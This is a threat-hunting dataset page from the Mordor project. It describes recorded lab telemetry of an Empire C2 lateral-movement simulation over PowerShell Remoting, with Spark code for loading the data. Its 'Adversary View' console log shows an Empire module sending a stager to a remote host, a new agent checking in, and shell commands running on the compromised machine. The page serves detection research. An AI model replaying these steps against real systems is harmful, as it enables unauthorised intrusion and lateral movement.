# Empire Invoke PSRemoting

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190518211456 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/lateral_movement/invoke_psremoting.py |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_invoke_psremoting.tar.gz |

## Dataset Description
This dataset represents adversaries executing malicious code on remote hosts using PowerShell Remotely.

## Adversary View
```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_psremoting
(Empire: powershell/lateral_movement/invoke_psremoting) > info

              Name: Invoke-PSRemoting
            Module: powershell/lateral_movement/invoke_psremoting
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using PSRemoting.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     True                                  Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                    separated.                              
  Proxy        False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  UserName     False                                 [domain\]username to use to execute     
                                                    command.                                
  ProxyCreds   False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  UserAgent    False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_psremoting) > execute
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 4
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_psremoting
(Empire: powershell/lateral_movement/invoke_psremoting) > [*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent 1NA52YVC checked in
[+] Initial agent 1NA52YVC from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to 1NA52YVC at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_psremoting) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:15:55  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:15:55  https           
EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:15:57  https           

V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:15:31  https           
XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:15:57  https           
1NA52YVC ps 172.18.39.105   IT001             *SHIRE\pgustavo         powershell         6884   5/0.0    2019-05-18 21:15:55  https           


(Empire: agents) > interact 1NA52YVC
(Empire: 1NA52YVC) > shell whoami
[*] Tasked 1NA52YVC to run TASK_SHELL
[*] Agent 1NA52YVC tasked with task ID 1
(Empire: 1NA52YVC) > shire\pgustavo
..Command execution completed.

(Empire: 1NA52YVC) > 
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_invoke_psremoting.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        
